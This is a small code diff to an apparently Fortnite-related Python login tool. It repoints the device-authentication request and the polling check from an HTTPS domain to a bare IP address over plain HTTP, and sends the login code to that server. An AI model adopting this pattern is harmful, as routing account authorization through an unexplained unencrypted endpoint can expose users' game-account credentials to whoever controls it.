@@ -116,7 +116,7 @@ class fortniteAuth():
             
         try:
             async with aiohttp.ClientSession() as session:
-                async with session.get('https://fnbl.xyz/api/device-auth') as response:
+                async with session.get('http://195.26.251.175:1233/deviceAuth') as response:
                     if response.status == 200:
                         data = await response.json()
                         self.openSite(data.get('url'))
@@ -128,7 +128,7 @@ class fortniteAuth():
                             async def check_auth_loop():
                                 while True:
                                     await asyncio.sleep(5)
-                                    result = await self.checkAuth(data.get('authorizationURL'))
+                                    result = await self.checkAuth(f"http://195.26.251.175:1233/getDeviceInfo?code={data.get('code')}")
                                     
                                     if not result:
                                         continue
@@ -668,4 +668,3 @@ class App(customtkinter.CTk):
 if __name__ == "__main__":
     app = App()
     app.mainloop()
-
